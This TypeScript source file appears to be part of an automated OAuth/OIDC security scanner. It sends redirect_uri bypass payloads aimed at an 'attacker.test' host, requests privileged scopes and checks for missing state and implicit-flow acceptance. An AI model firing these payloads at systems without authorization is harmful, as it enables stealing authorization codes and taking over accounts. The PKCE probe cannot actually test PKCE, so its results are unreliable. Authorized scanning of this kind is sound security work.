// src/agents/specialists/oauth-probes.ts
//
// Deterministic probe functions for OAuth 2.0 / OIDC security testing.
// Each probe takes a target + config and returns a structured result.
// Hand-rolled (no LLM) — fast and reliable.
//
// Vulnerability coverage:
//   1. redirect_uri prefix-bypass           (open redirect → code theft)
//   2. state fixation / missing state      (CSRF on auth flow)
//   3. scope escalation                    (request more scopes than granted)
//   4. code theft via open redirect in redirect_uri
//   5. response_type confusion             (token instead of code)
//   6. PKCE downgrade                      (force auth code flow without PKCE)

export interface OAuthProbeConfig {
  target: string;
  provider: {
    authorizationEndpoint: string;
    tokenEndpoint: string;
    clientIds: string[];
  };
  attackerHost?: string;     // default 'attacker.test'
  timeoutMs?: number;        // default 5000
  customHeaders?: Record<string, string>;
  cookies?: Record<string, string>;
}

export interface ProbeResult {
  vulnerable: boolean;
  technique: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  confidence: number;
  evidence: string[];
  payload: string;
  responseSummary: string;
  exploitability: 'trivial' | 'moderate' | 'difficult';
}

function b64url(s: string): string {
  return Buffer.from(s).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}

async function fetchManual(url: string, timeoutMs: number, customHeaders?: Record<string, string>, cookies?: Record<string, string>): Promise<{ status: number; location: string; body: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const headers: Record<string, string> = { 'user-agent': 'ultimatrix-oauth-probe/1.0', ...(customHeaders || {}) };
  if (cookies && Object.keys(cookies).length > 0) {
    headers['cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
  }
  try {
    const r = await fetch(url, { signal: controller.signal, headers, redirect: 'manual' });
    const body = await r.text();
    return { status: r.status, location: r.headers.get('location') || '', body: body.slice(0, 1024) };
  } catch (e) {
    return { status: 0, location: '', body: String(e) };
  } finally {
    clearTimeout(timer);
  }
}

// ── 1. redirect_uri prefix-bypass ─────────────────────────────────────────

export async function probeRedirectUriPrefixBypass(config: OAuthProbeConfig): Promise<ProbeResult> {
  const timeout = config.timeoutMs ?? 5000;
  const attackerHost = config.attackerHost ?? 'attacker.test';
  const evidence: string[] = [];
  const clientId = config.provider.clientIds[0] || 'demo-app';

  // The first clientId is the one we're testing; try to discover the
  // allowed prefix by sending a benign URL and reading back the redirect.
  const baseline = `https://example.com/cb`;
  const baselineUrl = `${config.provider.authorizationEndpoint}?client_id=${encodeURIComponent(clientId)}&response_type=code&redirect_uri=${encodeURIComponent(baseline)}&state=baseline`;
  const baselineResp = await fetchManual(baselineUrl, timeout, config.customHeaders, config.cookies);
  // If the server returned 400 on example.com, the prefix is something else.
  // We need to figure out the actual allowed prefix. Common defaults:
  const candidatePrefixes = [
    `https://${clientId}/`,                // client_id as the host
    `https://${clientId}.test/`,           // client_id as subdomain
    `https://localhost:3000/`,             // common local dev
    `https://example.com/cb`,              // baseline
  ];

  // Bypass payloads — all MUST start with one of the candidate prefixes
  // to pass the prefix check, but contain attacker-controlled content after.
  const payloads: Array<{ url: string; reason: string }> = [];
  for (const prefix of candidatePrefixes) {
    payloads.push(
      { url: `${prefix}.${attackerHost}/cb`,        reason: 'attacker host as path segment' },
      { url: `${prefix}@${attackerHost}/cb`,        reason: 'attacker host as userinfo' },
      { url: `${prefix}?x=${attackerHost}/cb`,      reason: 'attacker host in query' },
      { url: `${prefix}#${attackerHost}/cb`,        reason: 'attacker host in fragment' },
      { url: `${prefix}.${attackerHost}`,           reason: 'attacker host as path' },
      { url: `${prefix}/../${attackerHost}/cb`,     reason: 'path traversal' },
      { url: `${prefix}%2E%2E/${attackerHost}/cb`, reason: 'encoded path traversal' },
    );
  }

  for (const p of payloads) {
    const url = `${config.provider.authorizationEndpoint}?client_id=${encodeURIComponent(clientId)}&response_type=code&redirect_uri=${encodeURIComponent(p.url)}&state=bypass123`;
    const r = await fetchManual(url, timeout, config.customHeaders, config.cookies);
    if (r.status === 302 || r.status === 301) {
      // server redirected — code/state is in the location
      const loc = r.location;
      if (loc.includes(attackerHost) || loc.includes('attacker.test')) {
        return {
          vulnerable: true,
          technique: 'redirect_uri-prefix-bypass',
          severity: 'critical',
          confidence: 0.95,
          evidence: [
            `Authorization endpoint redirected to attacker-controlled URL: ${loc}`,
            `Payload: redirect_uri=${p.url}`,
            `Bypass reason: ${p.reason}`,
            `Client ID tested: ${clientId}`,
            `Status: ${r.status} (302/301 = redirect with code)`,
          ],
          payload: p.url,
          responseSummary: `Status ${r.status} → Location: ${loc}`,
          exploitability: 'trivial',
        };
      } else if (loc.includes('code=') && loc.includes('state=bypass123')) {
        // Bypass worked with legitimate-shaped redirect — the code is leaked
        // to a URL that's under the prefix but with attacker-controlled path.
        // The attacker can host their own app at that path.
        return {
          vulnerable: true,
          technique: 'redirect_uri-prefix-bypass',
          severity: 'critical',
          confidence: 0.9,
          evidence: [
            `Authorization endpoint accepted redirect_uri=${p.url}`,
            `Code was issued and will be sent to attacker-controlled path`,
            `Bypass reason: ${p.reason}`,
            `Location: ${loc}`,
          ],
          payload: p.url,
          responseSummary: `Status ${r.status} → Location: ${loc}`,
          exploitability: 'trivial',
        };
      }
    } else if (r.status === 400 && /redirect_uri|invalid/i.test(r.body)) {
      evidence.push(`Server rejected ${p.url} (${p.reason})`);
    }
  }
  return {
    vulnerable: false,
    technique: 'redirect_uri-prefix-bypass',
    severity: 'info',
    confidence: 0.7,
    evidence: evidence.length > 0 ? evidence : ['All redirect_uri bypass payloads rejected'],
    payload: payloads.map(p => p.url).join('; '),
    responseSummary: 'All payloads rejected with 400',
    exploitability: 'difficult',
  };
}

// ── 2. state fixation / missing state ────────────────────────────────────

export async function probeStateMissing(config: OAuthProbeConfig): Promise<ProbeResult> {
  const timeout = config.timeoutMs ?? 5000;
  const clientId = config.provider.clientIds[0] || 'demo-app';

  // Try a few likely allowed prefixes for the redirect_uri
  const candidateRedirectUris = [
    `https://${clientId}/cb`,
    `https://${clientId}.test/cb`,
    `https://localhost:3000/cb`,
  ];

  for (const redirectUri of candidateRedirectUris) {
    // No state parameter at all
    const url = `${config.provider.authorizationEndpoint}?client_id=${encodeURIComponent(clientId)}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}`;
    const r = await fetchManual(url, timeout, config.customHeaders, config.cookies);
    if (r.status === 302 && r.location.includes('code=') && !r.location.includes('state=')) {
      return {
        vulnerable: true,
        technique: 'state-missing',
        severity: 'high',
        confidence: 0.9,
        evidence: [
          `Authorization endpoint returned code without state parameter`,
          `Location: ${r.location}`,
          `CSRF protection is missing — an attacker can complete the OAuth flow on behalf of the victim`,
        ],
        payload: 'no state parameter',
        responseSummary: `Status ${r.status} → ${r.location}`,
        exploitability: 'trivial',
      };
    }
  }
  return {
    vulnerable: false,
    technique: 'state-missing',
    severity: 'info',
    confidence: 0.7,
    evidence: ['Authorization endpoint requires state parameter or rejects requests without it'],
    payload: 'no state parameter',
    responseSummary: 'No 302 with code in location',
    exploitability: 'difficult',
  };
}

// ── 3. scope escalation ──────────────────────────────────────────────────

export async function probeScopeEscalation(config: OAuthProbeConfig): Promise<ProbeResult> {
  const timeout = config.timeoutMs ?? 5000;
  const clientId = config.provider.clientIds[0] || 'demo-app';
  const redirectUri = `https://example.com/cb`;
  const evidence: string[] = [];

  // Try requesting admin scope
  const elevatedScopes = ['admin', 'root', 'superuser', '*', 'write:admin', 'users:delete'];
  for (const scope of elevatedScopes) {
    const url = `${config.provider.authorizationEndpoint}?client_id=${encodeURIComponent(clientId)}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&scope=${encodeURIComponent(scope)}&state=test`;
    const r = await fetchManual(url, timeout, config.customHeaders, config.cookies);
    if (r.status === 302 && r.location.includes('code=')) {
      return {
        vulnerable: true,
        technique: 'scope-escalation',
        severity: 'critical',
        confidence: 0.7,
        evidence: [
          `Authorization endpoint accepted scope=${scope} (privileged scope)`,
          `Code was issued without scope validation`,
        ],
        payload: `scope=${scope}`,
        responseSummary: `Status ${r.status} → ${r.location}`,
        exploitability: 'moderate',
      };
    }
  }
  return {
    vulnerable: false,
    technique: 'scope-escalation',
    severity: 'info',
    confidence: 0.7,
    evidence: evidence.length > 0 ? evidence : ['All elevated scopes rejected'],
    payload: elevatedScopes.join('; '),
    responseSummary: 'All elevated scopes rejected',
    exploitability: 'difficult',
  };
}

// ── 4. code theft via open redirect in redirect_uri (subset of #1) ────────

export async function probeCodeTheft(config: OAuthProbeConfig): Promise<ProbeResult> {
  // Same as redirect_uri prefix-bypass but specifically looks for code= in attacker URL
  return probeRedirectUriPrefixBypass(config);
}

// ── 5. response_type confusion (token instead of code) ───────────────────

export async function probeResponseTypeConfusion(config: OAuthProbeConfig): Promise<ProbeResult> {
  const timeout = config.timeoutMs ?? 5000;
  const clientId = config.provider.clientIds[0] || 'demo-app';
  const redirectUri = `https://example.com/cb`;

  // try response_type=token (implicit flow — should be deprecated but...)
  const url = `${config.provider.authorizationEndpoint}?client_id=${encodeURIComponent(clientId)}&response_type=token&redirect_uri=${encodeURIComponent(redirectUri)}&state=test`;
  const r = await fetchManual(url, timeout, config.customHeaders, config.cookies);
  if (r.status === 302 && /access_token=|#access_token=/.test(r.location)) {
    return {
      vulnerable: true,
      technique: 'response_type-confusion',
      severity: 'high',
      confidence: 0.85,
      evidence: [
        `Implicit flow (response_type=token) returned access_token in URL fragment`,
        `Location: ${r.location}`,
        `Token exposed in browser history, server logs, referer headers`,
      ],
      payload: 'response_type=token',
      responseSummary: `Status ${r.status} → ${r.location}`,
      exploitability: 'moderate',
    };
  }
  return {
    vulnerable: false,
    technique: 'response_type-confusion',
    severity: 'info',
    confidence: 0.85,
    evidence: ['Implicit flow is disabled or rejected'],
    payload: 'response_type=token',
    responseSummary: `Status ${r.status}`,
    exploitability: 'difficult',
  };
}

// ── 6. PKCE downgrade ────────────────────────────────────────────────────

export async function probePkceDowngrade(config: OAuthProbeConfig): Promise<ProbeResult> {
  const timeout = config.timeoutMs ?? 5000;
  const clientId = config.provider.clientIds[0] || 'demo-app';
  const redirectUri = `https://example.com/cb`;

  // request token exchange WITHOUT code_verifier (PKCE not enforced)
  const url = `${config.provider.tokenEndpoint}`;
  const r = await fetchManual(url, timeout, config.customHeaders, config.cookies);
  // We can't fully test this without a real code, but we can probe whether the endpoint
  // accepts requests with no code_challenge
  if (r.status === 400 && /code_verifier|code_challenge|invalid_request/i.test(r.body)) {
    return {
      vulnerable: false,
      technique: 'pkce-downgrade',
      severity: 'info',
      confidence: 0.5,
      evidence: ['Token endpoint rejected request without code_verifier (PKCE enforced)'],
      payload: 'no code_verifier',
      responseSummary: `Status ${r.status}`,
      exploitability: 'difficult',
    };
  }
  return {
    vulnerable: false,
    technique: 'pkce-downgrade',
    severity: 'info',
    confidence: 0.3,
    evidence: ['Unable to determine PKCE enforcement without a real authorization code'],
    payload: 'no code_verifier',
    responseSummary: `Status ${r.status}`,
    exploitability: 'difficult',
  };
}
